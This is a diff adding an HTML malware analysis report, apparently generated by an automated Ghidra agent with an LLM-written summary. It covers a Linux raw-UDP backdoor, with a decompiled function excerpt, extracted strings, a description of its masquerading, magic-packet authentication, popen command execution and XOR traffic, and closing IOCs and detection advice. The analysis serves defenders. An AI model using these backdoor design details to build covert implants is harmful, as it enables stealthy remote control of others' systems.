+    local_d = local_d + 1;
+  }
+  return param_4;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">__do_global_dtors_aux</div>
+            <pre><code>
+/* WARNING: Removing unreachable block (ram,0x00400b21) */
+
+void __do_global_dtors_aux(void)
+
+{
+  if (completed_6145 == &#x27;\0&#x27;) {
+    completed_6145 = &#x27;\x01&#x27;;
+  }
+  return;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">__do_global_ctors_aux</div>
+            <pre><code>
+void __do_global_ctors_aux(void)
+
+{
+  code *pcVar1;
+  undefined8 *puVar2;
+  
+  puVar2 = &amp;__CTOR_LIST__;
+  pcVar1 = __CTOR_LIST__;
+  while (pcVar1 != (code *)0xffffffffffffffff) {
+    puVar2 = puVar2 + -1;
+    (*pcVar1)();
+    pcVar1 = (code *)*puVar2;
+  }
+  return;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">__libc_csu_init</div>
+            <pre><code>
+/* WARNING: Removing unreachable block (ram,0x004017fa) */
+/* WARNING: Removing unreachable block (ram,0x00401800) */
+
+void __libc_csu_init(EVP_PKEY_CTX *param_1)
+
+{
+  _init(param_1);
+  return;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">frame_dummy</div>
+            <pre><code>
+/* WARNING: Removing unreachable block (ram,0x00400b68) */
+
+void frame_dummy(void)
+
+{
+  return;
+}
+
+</code></pre>
+        </div>
+
+        <!-- Strings -->
+        <h2 class="section-header">Strings (153 extracted)</h2>
+        <table class="data-table">
+            <thead><tr><th>Address</th><th>Value</th></tr></thead>
+            <tbody><tr><td class="mono">00400200</td><td>/lib64/ld-linux-x86-64.so.2</td></tr>
+<tr><td class="mono">00400501</td><td>__gmon_start__</td></tr>
+<tr><td class="mono">00400510</td><td>libc.so.6</td></tr>
+<tr><td class="mono">0040051a</td><td>socket</td></tr>
+<tr><td class="mono">00400521</td><td>strcpy</td></tr>
+<tr><td class="mono">00400528</td><td>exit</td></tr>
+<tr><td class="mono">0040052d</td><td>htons</td></tr>
+<tr><td class="mono">00400533</td><td>sprintf</td></tr>
+<tr><td class="mono">0040053b</td><td>fopen</td></tr>
+<tr><td class="mono">00400541</td><td>perror</td></tr>
+<tr><td class="mono">00400548</td><td>puts</td></tr>
+<tr><td class="mono">0040054d</td><td>fork</td></tr>
+<tr><td class="mono">00400552</td><td>popen</td></tr>
+<tr><td class="mono">00400558</td><td>fgetc</td></tr>
+<tr><td class="mono">0040055e</td><td>memset</td></tr>
+<tr><td class="mono">00400565</td><td>__errno_location</td></tr>
+<tr><td class="mono">00400576</td><td>fseek</td></tr>
+<tr><td class="mono">0040057c</td><td>recv</td></tr>
+<tr><td class="mono">00400581</td><td>memcpy</td></tr>
+<tr><td class="mono">00400588</td><td>fclose</td></tr>
+<tr><td class="mono">0040058f</td><td>setsockopt</td></tr>
+<tr><td class="mono">0040059a</td><td>__sysv_signal</td></tr>
+<tr><td class="mono">004005a8</td><td>pclose</td></tr>
+<tr><td class="mono">004005af</td><td>fwrite</td></tr>
+<tr><td class="mono">004005b6</td><td>sendto</td></tr>
+<tr><td class="mono">004005bd</td><td>strerror</td></tr>
+<tr><td class="mono">004005c6</td><td>__libc_start_main</td></tr>
+<tr><td class="mono">004005d8</td><td>ntohs</td></tr>
+<tr><td class="mono">004005de</td><td>GLIBC_2.2.5</td></tr>
+<tr><td class="mono">00401898</td><td>socket(): %s
+</td></tr>
+<tr><td class="mono">004018a6</td><td>setsockopt error!</td></tr>
+<tr><td class="mono">004018b8</td><td>idkey not correct,%d!=%d
+</td></tr>
+<tr><td class="mono">004018d8</td><td>receive %d, cmd type is %d and cmdl is %d
+</td></tr>
+<tr><td class="mono">00401906</td><td>system.conf</td></tr>
+<tr><td class="mono">00401912</td><td>%d file data is received
+</td></tr>
+<tr><td class="mono">0040192f</td><td>excute result is %s
+</td></tr>
+<tr><td class="mono">00401944</td><td>send %d
+</td></tr>
+<tr><td class="mono">00401950</td><td>server error: &#x27;%s&#x27; cannt execute
+</td></tr>
+<tr><td class="mono">.comment::00000001</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.comment::0000002f</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.comment::0000005d</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.comment::0000008b</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.comment::000000b9</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.comment::000000e7</td><td>GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr>
+<tr><td class="mono">.shstrtab::00000001</td><td>.symtab</td></tr>
+<tr><td class="mono">.shstrtab::00000009</td><td>.strtab</td></tr>
+<tr><td class="mono">.shstrtab::00000011</td><td>.shstrtab</td></tr>
+<tr><td class="mono">.shstrtab::0000001b</td><td>.interp</td></tr>
+<tr><td class="mono">.shstrtab::00000023</td><td>.note.ABI-tag</td></tr>
+<tr><td class="mono">.shstrtab::00000031</td><td>.gnu.hash</td></tr>
+<tr><td class="mono">.shstrtab::0000003b</td><td>.dynsym</td></tr>
+<tr><td class="mono">.shstrtab::00000043</td><td>.dynstr</td></tr>
+<tr><td class="mono">.shstrtab::0000004b</td><td>.gnu.version</td></tr>
+<tr><td class="mono">.shstrtab::00000058</td><td>.gnu.version_r</td></tr>
+<tr><td class="mono">.shstrtab::00000067</td><td>.rela.dyn</td></tr>
+<tr><td class="mono">.shstrtab::00000071</td><td>.rela.plt</td></tr>
+<tr><td class="mono">.shstrtab::0000007b</td><td>.init</td></tr>
+<tr><td class="mono">.shstrtab::00000081</td><td>.text</td></tr>
+<tr><td class="mono">.shstrtab::00000087</td><td>.fini</td></tr>
+<tr><td class="mono">.shstrtab::0000008d</td><td>.rodata</td></tr>
+<tr><td class="mono">.shstrtab::00000095</td><td>.eh_frame_hdr</td></tr>
+<tr><td class="mono">.shstrtab::000000a3</td><td>.eh_frame</td></tr>
+<tr><td class="mono">.shstrtab::000000ad</td><td>.ctors</td></tr>
+<tr><td class="mono">.shstrtab::000000b4</td><td>.dtors</td></tr>
+<tr><td class="mono">.shstrtab::000000bb</td><td>.jcr</td></tr>
+<tr><td class="mono">.shstrtab::000000c0</td><td>.dynamic</td></tr>
+<tr><td class="mono">.shstrtab::000000c9</td><td>.got</td></tr>
+<tr><td class="mono">.shstrtab::000000ce</td><td>.got.plt</td></tr>
+<tr><td class="mono">.shstrtab::000000d7</td><td>.data</td></tr>
+<tr><td class="mono">.shstrtab::000000dd</td><td>.bss</td></tr>
+<tr><td class="mono">.shstrtab::000000e2</td><td>.comment</td></tr>
+<tr><td class="mono">.strtab::00000001</td><td>call_gmon_start</td></tr>
+<tr><td class="mono">.strtab::00000011</td><td>crtstuff.c</td></tr>
+<tr><td class="mono">.strtab::0000001c</td><td>__CTOR_LIST__</td></tr>
+<tr><td class="mono">.strtab::0000002a</td><td>__DTOR_LIST__</td></tr>
+<tr><td class="mono">.strtab::00000038</td><td>__JCR_LIST__</td></tr>
+<tr><td class="mono">.strtab::00000045</td><td>dtor_idx.6147</td></tr>
+<tr><td class="mono">.strtab::00000053</td><td>completed.6145</td></tr>
+<tr><td class="mono">.strtab::00000062</td><td>__do_global_dtors_aux</td></tr>
+<tr><td class="mono">.strtab::00000078</td><td>frame_dummy</td></tr>
+<tr><td class="mono">.strtab::00000084</td><td>__CTOR_END__</td></tr>
+<tr><td class="mono">.strtab::00000091</td><td>__FRAME_END__</td></tr>
+<tr><td class="mono">.strtab::0000009f</td><td>__JCR_END__</td></tr>
+<tr><td class="mono">.strtab::000000ab</td><td>__do_global_ctors_aux</td></tr>
+<tr><td class="mono">.strtab::000000c1</td><td>dnsd.c</td></tr>
+<tr><td class="mono">.strtab::000000c8</td><td>idkey</td></tr>
+<tr><td class="mono">.strtab::000000ce</td><td>__preinit_array_start</td></tr>
+<tr><td class="mono">.strtab::000000e4</td><td>__fini_array_end</td></tr>
+<tr><td class="mono">.strtab::000000f5</td><td>_GLOBAL_OFFSET_TABLE_</td></tr>
+<tr><td class="mono">.strtab::0000010b</td><td>__preinit_array_end</td></tr>
+<tr><td class="mono">.strtab::0000011f</td><td>__fini_array_start</td></tr>
+<tr><td class="mono">.strtab::00000132</td><td>__init_array_end</td></tr>
+</tbody>
+        </table>
+
+        <!-- LLM Synthesis (shared) -->
+        <h2 class="section-header">LLM Analysis Summary</h2>
+        <div style="font-size: 0.82rem; color: #6b7280; font-style: italic; margin-bottom: 8px;">
+            This summary was generated by the LLM using combined data from all active agents.
+        </div>
+        <div class="summary-box"><h3>1. Executive Summary</h3>
+<p class="mb-3">The analyzed binary is a Linux backdoor (ELF 64-bit) that utilizes a Raw UDP socket to establish a covert command and control (C2) channel. Upon execution, it attempts to mask its identity by setting the process name to <code>[syslog]</code> and requires root privileges to create a raw socket. The malware listens for packets containing a specific magic number (<code>0x84b</code>) to authenticate incoming commands. Its capabilities include remote shell command execution via <code>popen</code> and writing arbitrary data to a local file named <code>system.conf</code>. Communication is obfuscated using a custom XOR encryption routine. The presence of raw socket manipulation and process masquerading indicates a threat designed for persistence and stealth on Linux systems.</p>
+
+<h3>2. Malware Capabilities</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Raw Socket Communication</strong>: Creates a socket <code>AF_INET, SOCK_RAW, IPPROTO_UDP</code> to sniff/intercept network traffic, bypassing standard OS port filtering.</li>
+<li class="mb-2"><strong>Process Masquerading</strong>: Modifies <code>argv[0]</code> to <code>[syslog]</code> to blend in with legitimate system processes.</li>
+<li class="mb-2"><strong>Remote Command Execution</strong>: Executes arbitrary shell commands received from the C2 server using <code>popen</code> and returns the output.</li>
+<li class="mb-2"><strong>File Manipulation</strong>: Capability to write received file data to disk (<code>system.conf</code>).</li>
+<li class="mb-2"><strong>XOR Encryption</strong>: Uses a simple 4-byte XOR key (<code>idkey</code>) to encrypt outgoing traffic and decrypt incoming traffic.</li>
+<li class="mb-2"><strong>Packet Manipulation</strong>: Manually constructs UDP/IP packets, including checksum calculation (<code>udp_tcp_checksum</code>) and source/destination address swapping to send replies back to the attacker.</li>
+
+<h3>3. Binary Information</h3>
+<table class="w-full text-left border-collapse"><tr><th>Property</th><th>Value</th></tr><tr><td>SHA256</td><td>827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161</td></tr><tr><td>Architecture</td><td>x86_64</td></tr><tr><td>Type</td><td>ELF</td></tr><tr><td>Image Base</td><td>0x00400000</td></tr><tr><td>Entry Point</td><td>0x004017b0 (_start)</td></tr><tr><td>Compiler</td><td>GCC (GNU) 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr><tr><td>Size</td><td>Unknown</td></tr><tr><td>Packing</td><td>Unpacked</td></tr></table>
+
+<h3>4. Technical Analysis</h3>
+
+<strong>Process Masquerading &amp; Initialization</strong>
+</ul>
+<p class="mb-3">The <code>main</code> function begins by checking the argument count. If sufficient arguments exist, it overwrites <code>argv[0]</code> with the string <code>[syslog]</code> (hex <code>7379735b</code>, <code>64676f6c</code>, <code>5d</code>). This is a standard technique to hide the malicious process in a process list.</p>
+
+<strong>Network Setup</strong>
+<p class="mb-3">The malware calls <code>__sysv_signal</code> to handle signals, followed by <code>socket(2, 3, 0x11)</code> (AF_INET, SOCK_RAW, IPPROTO_UDP). This requires root privileges. It sets a socket option via <code>setsockopt</code> (likely <code>SO_BROADCAST</code> or similar based on the argument).</p>
+
+<strong>Command Processing Loop</strong>
+<p class="mb-3">The binary enters a loop calling <code>recv</code> on the raw socket. It waits for a packet where a specific field (converted via <code>ntohs</code>) equals <code>0x84b</code>. This acts as the authentication magic number. It then checks a command type byte:</p>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">If the command type is <code>0x02</code>, it opens <code>system.conf</code> and appends data to it.</li>
+<li class="mb-2">For other types (implied execution flow), it forks a child process. The child process calls <code>remoteExec</code> to run the command, then <code>sendResult2Peer</code> to send the output back.</li>
+
+<strong>C2 Communication</strong>
+</ul>
+<p class="mb-3"><code>sendResult2Peer</code> constructs a response packet. It swaps the source and destination IP/ports from the received packet to route the reply correctly. It encrypts the payload using <code>myEncryptFun</code> and calculates the UDP checksum manually before sending via <code>sendto</code>.</p>
+
+<pre><code>// Snippet from main showing process name spoofing and magic number check
+puVar2 = (undefined4 *)*param_2;
+*puVar2 = 0x7379735b; // &quot;[sys&quot;
+puVar2[1] = 0x64676f6c; // &quot;log]&quot;
+*(undefined2 *)(puVar2 + 2) = 0x5d;
+// ...
+uVar3 = ntohs(local_832);
+} while (uVar3 != 0x84b); // Magic number check
+</code></pre>
+
+<h3>5. Functions Analysis</h3>
+
+<strong>main @ 0x00400b78 (0 xrefs from listed, but is entry point)</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Main control loop for the malware. Handles process name spoofing, socket creation, and command dispatching.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>socket(2, 3, 0x11)</code>, <code>ntohs(local_832) != 0x84b</code>, <code>fork()</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: The use of raw sockets allows the malware to bypass firewall rules that typically filter based on ports and inspect traffic before it reaches the standard network stack.</li>
+
+<strong>remoteExec @ 0x004010ce</strong>
+<li class="mb-2"><strong>Purpose</strong>: Executes a shell command received from the network and captures the output.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>popen(param_1,&quot;r&quot;)</code>, loop reading via <code>fgetc</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: Allows arbitrary code execution (ACE) on the infected host. The error message &quot;server error: &#x27;%s&#x27; cannt execute&quot; confirms intent to execute commands.</li>
+
+<strong>sendResult2Peer @ 0x00401216</strong>
+<li class="mb-2"><strong>Purpose</strong>: Encrypts and transmits the result of the command execution back to the controller.</li>
+<li class="mb-2"><strong>Key Code</strong>: Swaps IP/Port headers, calls <code>myEncryptFun</code>, <code>udp_tcp_checksum</code>, <code>sendto</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: Manually constructing packets (Raw Socket) is indicative of sophisticated malware attempting to evade IDS/IPS that might inspect standard API calls.</li>
+
+<strong>myEncryptFun @ 0x0040163e (Approx, from export list)</strong>
+<li class="mb-2"><strong>Purpose</strong>: Performs XOR encryption on the data payload.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>*(byte *)(local_c + param_5) = *(byte *)(local_c + param_3) ^ *(byte *)((ulong)local_d + param_1);</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: Simple XOR encryption is weak and easily reversed, but sufficient to bypass simple string-based detection mechanisms.</li>
+
+<strong>udp_tcp_checksum @ 0x004016b8</strong>
+<li class="mb-2"><strong>Purpose</strong>: Calculates the standard internet checksum for the UDP packet to ensure network validity.</li>
+<li class="mb-2"><strong>Key Code</strong>: Pseudo-header construction + <code>checksum()</code> call.</li>
+
+<h3>6. Operational Flow</h3>
+</ul>
+<ol class="list-decimal pl-6 mb-4">
+<li class="mb-2"><strong>Initialization</strong>: The binary starts, checks arguments, and overwrites <code>argv[0]</code> with <code>[syslog]</code>.</li>
+<li class="mb-2"><strong>Setup</strong>: Establishes a Raw UDP socket (<code>socket()</code>, <code>setsockopt()</code>).</li>
+<li class="mb-2"><strong>Main Operation</strong>: Enters an infinite loop to <code>recv</code> data.</li>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">  Checks if the received packet contains the magic number <code>0x84b</code>.</li>
+<li class="mb-2">  Validates the packet type (offset <code>iVar4 + 1</code>).</li>
+<li class="mb-2">  If type is <code>0x02</code>: Writes payload to <code>system.conf</code>.</li>
+<li class="mb-2">  Otherwise (Execution): Forks the process. The child process executes the command via <code>remoteExec</code>.</li>
+</ul>
+<li class="mb-2"><strong>Persistence</strong>: The process runs as a daemon (implied by the loop and signal handling), maintaining the raw socket connection to listen for further commands. It relies on the attacker to restart it if the host reboots (no auto-start mechanism explicitly found in the provided code).</li>
+
+<h3>7. C2 &amp; Networking</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">  <strong>C2 Servers</strong>: None hardcoded; the malware responds to the source IP of the received packet (passive backdoor).</li>
+<li class="mb-2">  <strong>Protocols</strong>: Raw UDP (IP Protocol 17).</li>
+<li class="mb-2">  <strong>Communication Pattern</strong>:</li>
+<li class="mb-2">  <strong>Inbound</strong>: Malware sniffs for UDP packets with magic header <code>0x84b</code>.</li>
+<li class="mb-2">  <strong>Outbound</strong>: Malware crafts a new UDP packet, swapping Source/Dest IPs and Ports from the received packet, encrypts the payload (XOR), calculates checksums, and sends it.</li>
+
+<h3>8. Evidence of Malicious Activity</h3>
+</ul>
+<li class="mb-2"><strong>Finding</strong>: Process Masquerading - Evidence: <code>[syslog]</code> string (hex <code>7379735b...</code>) at <code>0x00400b78</code>.</li>
+<li class="mb-2"><strong>Finding</strong>: Raw Socket Creation - Evidence: <code>socket(2, 3, 0x11)</code> call at <code>0x00400b78</code> (AF_INET, SOCK_RAW, IPPROTO_UDP).</li>
+<li class="mb-2"><strong>Finding</strong>: Remote Code Execution - Evidence: <code>popen</code> call in <code>remoteExec</code> at <code>0x004010ce</code>.</li>
+<li class="mb-2"><strong>Finding</strong>: File Write Capability - Evidence: String <code>&quot;system.conf&quot;</code> and <code>fopen(&quot;system.conf&quot;,&quot;w+&quot;)</code> at <code>0x00400b78</code>.</li>
+
+<h3>9. Recommendations</h3>
+<li class="mb-2"><strong>Network Monitoring</strong>: Implement anomaly detection for raw socket usage on endpoints, as this is rarely used by legitimate applications.</li>
+<li class="mb-2"><strong>Process Monitoring</strong>: Monitor for processes named <code>[syslog]</code> or other common service names that are spawning from unexpected locations or user contexts.</li>
+<li class="mb-2"><strong>File Integrity</strong>: Monitor for the creation of <code>system.conf</code> in root directories or unusual locations.</li>
+<li class="mb-2"><strong>Signature Detection</strong>: Create signatures for the magic packet value <code>0x84b</code> in raw UDP headers to identify infection traffic.</li>
+
+<h3>10. IOCs (Indicators of Compromise)</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">  <strong>Filename</strong>: <code>system.conf</code> - Used for storing data received from C2.</li>
+<li class="mb-2">  <strong>Process Name</strong>: <code>[syslog]</code> - Used to masquerade the running malware.</li>
+<li class="mb-2">  <strong>Network Magic</strong>: <code>0x84b</code> (2123) - Specific value used in UDP packets to trigger command execution.</li>
+<li class="mb-2">  <strong>String</strong>: <code>&quot;server error: &#x27;%s&#x27; cannt execute&quot;</code> - Unique error string found in the binary.</li>
+
+<h3>11. Conclusion</h3>
+</ul>
+</ol>
+<p class="mb-3">The binary is a sophisticated Linux backdoor utilizing raw sockets for covert communication and arbitrary command execution. Its use of process masquerading and packet manipulation suggests a focus on evasion and persistence. Immediate action is required to scan systems for the specific IOCs and block raw socket usage where not strictly necessary.</p></div>
+
+        <!-- Footer -->
+        <div style="margin-top: 40px; padding-top: 16px; border-top: 1px solid #d1d5db; display: flex; justify-content: space-between; font-size: 11px; color: #9ca3af;">
+            <div>Confidential &amp; Proprietary</div>
+            <div>Generated by Ghidra Analysis Agent</div>
+        </div>
+    </div>
+</body>
+</html>
